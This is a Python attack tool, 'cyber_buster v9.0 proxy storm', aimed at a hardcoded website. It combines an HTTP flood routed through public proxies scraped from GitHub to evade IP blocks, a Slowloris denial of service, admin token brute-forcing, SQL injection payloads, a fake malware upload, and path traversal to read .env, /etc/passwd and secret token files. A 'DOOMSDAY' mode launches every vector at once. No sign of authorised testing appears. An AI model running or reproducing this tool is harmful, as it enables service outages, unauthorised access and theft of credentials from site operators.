# cyber_buster_v9.0_proxy_storm.py - PROXY STORM EDITION (FIXED)
import asyncio
import httpx
import time
import os
import random
import string
import json
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.align import Align
from rich import box

# --- CONFIGURATION ---
TARGET_DOMAIN = "https://bonzvip.site/"
TARGET_HOST = "bonz"
REPORT_DIR = "reports"

# --- PROXY SOURCES (GIT REPOS) ---
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
]

# --- PAYLOADS ---
SQL_PAYLOADS = ["' OR '1'='1", "' OR 1=1--", "admin' --", "' UNION SELECT 1,2,3--"]
TRAVERSAL_PAYLOADS = ["../../.env", "../config.json", "/etc/passwd", "secrets/token.json"]
MALWARE_NAMES = ["backdoor.py", "shell.php", "hack.sh", "virus.exe"]
MALWARE_CONTENT = 'print("YOUR SYSTEM IS COMPROMISED")'

WAF_PATHS = ["/.env", "/.git/config", "/admin", "/api/config", "/wp-login.php"]

console = Console()
if not os.path.exists(REPORT_DIR): os.makedirs(REPORT_DIR)

# --- GLOBAL STATE ---
proxies_list = []
use_proxy = False

live_stats = {
    "flood": {"sent": 0, "blocked": 0, "failed": 0, "rps": 0},
    "slowloris": {"sockets": 0, "active": 0, "failed": 0},
    "auth": {"attempts": 0, "blocked": 0, "failed": 0},
    "proxies": {"loaded": 0, "alive": 0, "dead": 0},
    "large_payload": {"sent": 0, "status": "Idle"},
    "fuzz_sql": {"sent": 0, "errors": 0},
    "malware_upload": {"attempts": 0, "success_hacked": 0},
    "exfiltration": {"attempts": 0, "files_stolen": 0},
    "waf": {"sent": 0, "blocked": 0, "success": 0}
}
attack_start_time = 0

def reset_stats():
    global live_stats
    loaded = live_stats['proxies']['loaded'] # Keep loaded count
    live_stats = {k: {sk: 0 if isinstance(v[sk], (int, float)) else "" for sk in v} for k, v in live_stats.items()}
    live_stats['proxies']['loaded'] = loaded
    live_stats['large_payload']['status'] = "Idle"

# --- PROXY MANAGER ---
async def fetch_proxies():
    global proxies_list
    console.print("[bold yellow]🔄 Fetching Fresh Proxies from GitHub...[/]")
    async with httpx.AsyncClient() as client:
        for url in PROXY_SOURCES:
            try:
                resp = await client.get(url, timeout=10)
                if resp.status_code == 200:
                    lines = resp.text.splitlines()
                    for line in lines:
                        if line.strip():
                            proxies_list.append(f"http://{line.strip()}")
            except: pass
    
    # Remove duplicates
    proxies_list = list(set(proxies_list))
    live_stats['proxies']['loaded'] = len(proxies_list)
    console.print(f"[bold green]✅ Loaded {len(proxies_list)} unique proxies! (Armor Piercing Mode Ready)[/]")

def get_random_proxy():
    if not proxies_list: return None
    return random.choice(proxies_list)

# --- UI COMPONENTS ---
def get_banner():
    art = r"""
   ______      __              ____             __
  / ____/_  __/ /_  ___  _____/ __ )__  _______/ /____  _____
 / /   / / / / __ \/ _ \/ ___/ __  / / / / ___/ __/ _ \/ ___
/ /___/ /_/ / /_/ /  __/ /  / /_/ / /_/ (__  ) /_/  __/ /    
\____/\__, /_.___/\___/_/  /_____/\__,_/____/\__/_/\___/_/     
     /____/                                                  
    """
    return Panel(
        Align.center(f"[bold cyan]{art}[/]\n[bold white on blue] v9.0 - PROXY STORM (ARMOR PIERCING) [/]"),
        border_style="bright_blue",
        box=box.DOUBLE,
        subtitle=f"[grey53]Targeting: {TARGET_DOMAIN}[/]")

def make_layout() -> Layout:
    layout = Layout(name="root")
    layout.split(
        Layout(name="header", size=3),
        Layout(ratio=1, name="main"),
        Layout(name="footer", size=3)
    )
    layout["header"].update(Panel(Align.center(f"[bold red blink]⚔️  PROXY STORM ATTACK - {TARGET_DOMAIN} ⚔️[/]"), style="bold white on red", box=box.HEAVY_HEAD))
    layout["main"].split_row(Layout(name="left"), Layout(name="right"))
    layout["right"].split_column(Layout(name="top_right"), Layout(name="bottom_right"))
    layout["footer"].update(Panel(Align.center("Press [bold red]Ctrl+C[/] to STOP attack immediately."), style="grey50"))
    return layout

def create_stat_grid(stats_dict, color):
    grid = Table.grid(expand=True, padding=(0, 1))
    grid.add_column(style=f"bold {color}")
    grid.add_column(justify="right", style="white")
    for k, v in stats_dict.items():
        key_text = k.replace("_", " ").title()
        val_text = f"{v:.1f}" if isinstance(v, float) else f"{v:,}"
        grid.add_row(key_text, val_text)
    return grid

def get_attack_panel(attack_name, stats_key, color="green", icon="⚡") -> Panel:
    s = live_stats[stats_key]
    grid = create_stat_grid(s, color)
    return Panel(grid, title=f"[{color}]{icon} {attack_name}[/]", border_style=color, box=box.ROUNDED)

def update_layout(layout: Layout):
    global attack_start_time
    # Left Column
    layout["left"].split_column(
        Layout(get_attack_panel("HTTP Flood (Proxied)", "flood", "bright_red", "🌊")),
        Layout(Panel(create_stat_grid(live_stats['proxies'], "cyan"), title="[cyan]🌐 Proxy Network[/]", border_style="cyan", box=box.ROUNDED)),
        Layout(get_attack_panel("Malware Upload", "malware_upload", "red", "☣️"))
    )
    # Right Columns
    layout["top_right"].split_row(
        get_attack_panel("Auth Brute-Force", "auth", "yellow", "🔑"),
        get_attack_panel("SQL Injection", "fuzz_sql", "orange1", "💉")
    )
    layout["bottom_right"].split_row(
        get_attack_panel("Exfiltration", "exfiltration", "magenta", "🕵️"),
        get_attack_panel("Slowloris", "slowloris", "bright_blue", "🐢")
    )
    
    duration = time.time() - attack_start_time if attack_start_time > 0 else 0
    layout["footer"].update(Panel(Align.center(f"⏱️  Duration: [bold yellow]{duration:.1f}s[/] | Status: [bold green]ROTATING IPs[/]"), border_style="green"))
    return layout

# --- ATTACK WORKERS (PROXY ENABLED) ---
async def flood_worker(client):
    proxy = get_random_proxy() if use_proxy else None
    try:
        # Create a NEW client per request for rotation (Expensive but necessary for rotation)
        async with httpx.AsyncClient(proxies=proxy, verify=False, timeout=5.0) as p_client:
            headers = {"User-Agent": "".join(random.choices(string.ascii_letters, k=10))}
            resp = await p_client.post(f"{TARGET_DOMAIN}/api/analyze", json={"text": "flood"}, headers=headers)
            live_stats['flood']['sent'] += 1
            if use_proxy: live_stats['proxies']['alive'] += 1
            if resp.status_code in [403, 429]: live_stats['flood']['blocked'] += 1
    except:
        live_stats['flood']['failed'] += 1
        if use_proxy: live_stats['proxies']['dead'] += 1

async def slowloris_worker():
    # Slowloris works best directly or via SOCKS, HTTP proxies might buffer. 
    # We keep direct for now or standard HTTP connect.
    try:
        _, writer = await asyncio.open_connection(TARGET_HOST, 443, ssl=True)
        live_stats['slowloris']['active'] += 1
        writer.write(f"GET /?{random.randint(1,1000)} HTTP/1.1\r\nHost: {TARGET_HOST}\r\n".encode("utf-8"))
        await writer.drain()
        while True:
            writer.write(b"X-a: b\r\n")
            await writer.drain()
            await asyncio.sleep(10)
    except: live_stats['slowloris']['failed'] += 1
    finally:
        if live_stats['slowloris']['active'] > 0: live_stats['slowloris']['active'] -= 1

async def auth_brute_worker():
    proxy = get_random_proxy() if use_proxy else None
    token = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    try:
        async with httpx.AsyncClient(proxies=proxy, verify=False, timeout=5.0) as p_client:
            resp = await p_client.post(f"{TARGET_DOMAIN}/admin/login", data={"token": token})
            live_stats['auth']['attempts'] += 1
            if resp.status_code == 429: live_stats['auth']['blocked'] += 1
    except: live_stats['auth']['failed'] += 1

async def sql_fuzz_worker():
    proxy = get_random_proxy() if use_proxy else None
    payload = random.choice(SQL_PAYLOADS)
    try:
        async with httpx.AsyncClient(proxies=proxy, verify=False, timeout=5.0) as p_client:
            await p_client.post(f"{TARGET_DOMAIN}/admin/login", data={"token": payload})
            live_stats['fuzz_sql']['sent'] += 1
    except: pass

async def malware_upload_worker():
    proxy = get_random_proxy() if use_proxy else None
    malware_name = random.choice(MALWARE_NAMES)
    try:
        payload = {"filepath": malware_name, "content": MALWARE_CONTENT}
        async with httpx.AsyncClient(proxies=proxy, verify=False, timeout=5.0) as p_client:
            resp = await p_client.post(f"{TARGET_DOMAIN}/admin/api/file-content", json=payload)
            live_stats['malware_upload']['attempts'] += 1
            if resp.status_code == 200: live_stats['malware_upload']['success_hacked'] += 1
    except: pass

async def exfiltration_worker():
    proxy = get_random_proxy() if use_proxy else None
    target_file = random.choice(TRAVERSAL_PAYLOADS)
    try:
        async with httpx.AsyncClient(proxies=proxy, verify=False, timeout=5.0) as p_client:
            resp = await p_client.get(f"{TARGET_DOMAIN}/admin/api/file-content?filepath={target_file}")
            live_stats['exfiltration']['attempts'] += 1
            if resp.status_code == 200 and len(resp.text) > 0 and "error" not in resp.text:
                live_stats['exfiltration']['files_stolen'] += 1
    except: pass

async def run_waf_probe():
    async with httpx.AsyncClient(verify=False) as client:
        await asyncio.gather(*(waf_probe_worker(client, path) for path in WAF_PATHS))

async def waf_probe_worker(client, path):
    try:
        await client.get(f"{TARGET_DOMAIN}{path}")
        live_stats['waf']['sent'] += 1
    except: pass
    
async def run_large_payload():
     async with httpx.AsyncClient(verify=False) as client:
         try:
            nested_json = {"a": "b" * 1000}
            resp = await client.post(f"{TARGET_DOMAIN}/api/analyze", json=nested_json, timeout=30)
            live_stats['large_payload']['sent'] += 1
            live_stats['large_payload']['status'] = f"Done ({resp.status_code})"
         except: pass

# --- ATTACK CONTROLLERS ---
async def run_http_flood(duration, concurrency):
    end_time = time.time() + duration
    while time.time() < end_time:
        tasks = [flood_worker(None) for _ in range(concurrency)]
        await asyncio.gather(*tasks)

async def run_slowloris(duration, sockets_count):
    sockets_count = min(sockets_count, 1000) 
    live_stats['slowloris']['sockets'] = sockets_count
    loris_tasks = [asyncio.create_task(slowloris_worker()) for _ in range(sockets_count)]
    await asyncio.sleep(duration)
    for task in loris_tasks: task.cancel()

async def run_auth_brute(duration, concurrency):
    end_time = time.time() + duration
    while time.time() < end_time:
        tasks = [auth_brute_worker() for _ in range(concurrency)]
        await asyncio.gather(*tasks)

async def run_sql_fuzz(duration, concurrency):
    end_time = time.time() + duration
    while time.time() < end_time:
        tasks = [sql_fuzz_worker() for _ in range(concurrency)]
        await asyncio.gather(*tasks)

async def run_malware_sim(duration, concurrency):
    end_time = time.time() + duration
    while time.time() < end_time:
        tasks = [malware_upload_worker() for _ in range(concurrency)]
        await asyncio.gather(*tasks)

async def run_exfil_sim(duration, concurrency):
    end_time = time.time() + duration
    while time.time() < end_time:
        tasks = [exfiltration_worker() for _ in range(concurrency)]
        await asyncio.gather(*tasks)

# --- MAIN ORCHESTRATOR ---
async def run_scenario(duration, tasks_to_await):
    global attack_start_time
    attack_start_time = time.time()
    layout = make_layout()

    with Live(layout, screen=True, redirect_stderr=False, refresh_per_second=5) as live:
        main_tasks = [asyncio.create_task(task) for task in tasks_to_await]
        
        last_sent = 0
        last_time = time.time()
        start_loop = time.time()
        
        while time.time() - start_loop < duration:
            current_time = time.time()
            time_diff = current_time - last_time
            if time_diff > 1:
                sent_diff = live_stats['flood']['sent'] - last_sent
                live_stats['flood']['rps'] = sent_diff / time_diff
                last_sent = live_stats['flood']['sent']
                last_time = current_time
            
            live.update(update_layout(layout))
            if all(t.done() for t in main_tasks): break
            await asyncio.sleep(0.1)

        for t in main_tasks: t.cancel()
        await asyncio.gather(*main_tasks, return_exceptions=True)

# --- MAIN MENU ---
async def main():
    global use_proxy
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        console.print(get_banner())
        
        # PROXY CHECK
        if not proxies_list:
            console.print("[bold yellow]⚠️ No proxies loaded. Fetching now...[/]")
            await fetch_proxies()
        
        menu_table = Table(show_header=True, header_style="bold magenta", box=box.SIMPLE_HEAD)
        menu_table.add_column("ID", style="cyan", width=4, justify="center")
        menu_table.add_column("Protocol / Method", style="bold white")
        menu_table.add_column("Description", style="dim white")
        
        menu_table.add_row("1", "HTTP Flood", "Proxy Rotation (Bypass IP Blocks)")
        menu_table.add_row("2", "Slowloris", "Direct Connection (No Proxy)")
        menu_table.add_row("3", "Auth Brute-Force", "/admin/login (Proxied)")
        menu_table.add_row("6", "SQL Injection Fuzz", "Blind SQLi (Proxied)")
        menu_table.add_row("7", "Malware Upload Sim", "Fake RCE (Proxied)")
        menu_table.add_row("8", "Data Exfiltration", "Path Traversal (Proxied)")
        menu_table.add_section()
        menu_table.add_row("9", "DOOMSDAY", "[bold red]ALL VECTORS (PROXY STORM)[/]")
        menu_table.add_section()
        menu_table.add_row("P", "Toggle Proxy", f"Current: [bold {'green' if use_proxy else 'red'}]{'ON' if use_proxy else 'OFF'}[/]")
        menu_table.add_row("R", "Refresh Proxies", "Download fresh list")
        menu_table.add_row("0", "Exit", "Close Application")
        
        console.print(Align.center(menu_table))
        
        choice = console.input("\n[bold yellow]👉 Select Protocol ID: [/]").upper()
        if choice == '0': break
        
        if choice == 'P':
            use_proxy = not use_proxy
            continue
        if choice == 'R':
            await fetch_proxies()
            continue

        if choice not in ['1', '2', '3', '6', '7', '8', '9']: continue

        reset_stats()
        scenario_tasks = [] 
        duration = int(console.input("[bold cyan]⏱️  Set Duration (seconds) [30]: [/]") or 30)

        concurrency_factor = 50 if use_proxy else 200

        if choice == '1': scenario_tasks.append(run_http_flood(duration, concurrency_factor))
        elif choice == '2': scenario_tasks.append(run_slowloris(duration, 1000))
        elif choice == '3': scenario_tasks.append(run_auth_brute(duration, concurrency_factor // 2))
        elif choice == '6': scenario_tasks.append(run_sql_fuzz(duration, concurrency_factor // 2))
        elif choice == '7': scenario_tasks.append(run_malware_sim(duration, concurrency_factor // 4))
        elif choice == '8': scenario_tasks.append(run_exfil_sim(duration, concurrency_factor // 4))
        
        elif choice == '9': # Doomsday
            console.print("[bold red blink]!!! PROXY STORM ACTIVATED !!![/]")
            scenario_tasks.append(run_http_flood(duration, concurrency_factor))
            scenario_tasks.append(run_slowloris(duration, 1000))
            scenario_tasks.append(run_auth_brute(duration, concurrency_factor // 2))
            scenario_tasks.append(run_sql_fuzz(duration, concurrency_factor // 2))
            scenario_tasks.append(run_malware_sim(duration, concurrency_factor // 4))
            scenario_tasks.append(run_exfil_sim(duration, concurrency_factor // 4))
            scenario_tasks.append(run_waf_probe())
            scenario_tasks.append(run_large_payload())
        
        if scenario_tasks:
             await run_scenario(duration if duration > 0 else 10, scenario_tasks)

        filename = f"report_v9.0_{choice}_{int(time.time())}.json"
        with open(os.path.join(REPORT_DIR, filename), 'w') as f: json.dump(live_stats, f, indent=4)
        
        console.print(f"\n[bold green]✔ Mission Complete. Data Logged: {filename}[/]")
        input("\nPress Enter to return to base...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        console.print("\n[bold red]Operation Aborted by User.[/]")
    except Exception as e:
        console.print(f"\n[bold red]Critical Error: {e}[/]")